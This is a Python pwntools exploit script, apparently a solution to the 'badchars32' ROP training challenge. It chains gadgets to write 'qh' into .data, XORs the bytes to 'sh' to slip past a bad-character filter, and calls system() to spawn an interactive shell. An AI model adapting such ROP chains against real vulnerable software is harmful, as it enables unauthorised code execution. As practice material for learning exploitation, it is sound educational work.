from pwn import *

# bad charachters "bic/fns "
# 98,105,99,47,32,102,110,115
#'0x62' '0x69' '0x63' '0x2f' '0x66' '0x6e' '0x73' '0x20'

#[Sections] read and writeable
#Nm Paddr       Size Vaddr      Memsz Perms Name
#19 0x00000f08     4 0x08049f08     4 -rw- .init_array
#20 0x00000f0c     4 0x08049f0c     4 -rw- .fini_array
#21 0x00000f10     4 0x08049f10     4 -rw- .jcr
#22 0x00000f14   232 0x08049f14   232 -rw- .dynamic
#23 0x00000ffc     4 0x08049ffc     4 -rw- .got
#24 0x00001000    56 0x0804a000    56 -rw- .got.plt
#25 0x00001038     8 0x0804a038     8 -rw- .data
#26 0x00001040     0 0x0804a040    44 -rw- .bss
write_to = 0x0804a038

#  0x08048893               8937  mov dword [edi], esi
#  0x08048895                 c3  ret
mov_esi_edi_pointer = 0x08048893

#  0x08048899                 5e  pop esi
#  0x0804889a                 5f  pop edi
#  0x0804889b                 c3  ret
pop_esi_edi = 0x08048899

#  0x08048896                 5b  pop ebx
#  0x08048897                 59  pop ecx
#  0x08048898                 c3  ret
pop_ebx_ecx = 0x08048896

#  0x08048890               300b  xor byte [ebx], cl
#  0x08048892                 c3  ret
xor_ebx_cl = 0x08048890

# 040 0x00000973 0x08048973   7   8 (.rodata) ascii /bin/ls
bin_ls = 0x08048973

badchars32 = ELF('badchars32')

rop_chain = "Z"*44

# ord('s')^2 == q
# xor q, 0x02
# system('sh') assumes sh is in PATH
# Take control of the registers
rop_chain += p32(pop_esi_edi)
rop_chain += "qh\x00\x00"
rop_chain += p32(write_to)
rop_chain += p32(mov_esi_edi_pointer)

rop_chain += p32(pop_ebx_ecx)
rop_chain += p32(write_to)
rop_chain += "\x02\x02\x02\x02"
rop_chain += p32(xor_ebx_cl)

# 0x080484e0    1 6            sym.imp.system
rop_chain += p32(0x080484e0)
rop_chain += p32(write_to)
rop_chain += p32(write_to)

p = process(badchars32.path)
p.recvuntil('> ')
p.sendline(rop_chain)
p.interactive()
